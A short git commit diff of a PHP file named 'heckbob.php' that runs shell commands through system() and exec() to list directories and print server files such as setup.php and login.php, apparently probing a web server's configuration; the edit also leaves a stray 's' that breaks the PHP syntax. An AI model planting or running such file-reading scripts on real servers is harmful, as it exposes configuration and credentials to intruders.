a37dd9657f2864f55060a11382cb6fd042943c4c
Oluwakemi Odusanya <odus.kemi@gmail.com>
2018-03-18 16:46:57 -0400

    Update heckbob.php

--- heckbob.php
+++ heckbob.php
@@ -7,8 +7,8 @@ echo system('cat setup.php');
 echo "last \n";
 echo system('ls ..');
 echo exec('ls ..');
-echo system('ls');
+echo system('ls');s
 echo system('cat refresh.html');
 echo system('cat login.php');
-echo system('ls ../html');
+echo system('cat ../html/setup.php');
 ?>
